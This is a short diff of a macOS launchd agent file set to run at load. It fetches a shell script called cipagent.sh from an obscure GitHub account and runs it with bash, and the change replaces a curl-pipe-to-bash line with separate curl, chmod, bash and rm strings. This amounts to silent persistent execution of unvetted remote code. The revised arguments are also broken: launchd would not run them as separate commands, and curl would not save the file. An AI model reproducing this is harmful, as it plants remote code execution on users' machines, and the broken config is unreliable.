@@ -6,7 +6,10 @@
 	<string>com.zerowidth.launched.thisisthenameofthelaunchd</string>
 	<key>ProgramArguments</key>
 	<array>
-		<string>curl https://raw.githubusercontent.com/g6mqchyhTy/cipagent/master/cipagent.sh | bash</string>
+		<string>curl https://raw.githubusercontent.com/g6mqchyhTy/cipagent/master/cipagent.sh</string>
+		<string>chmod +x cipagent.sh</string>
+		<string>bash cipagent.sh</string>
+		<string>rm cipagent.sh</string>
 	</array>
 	<key>RunAtLoad</key>
 	<true/>
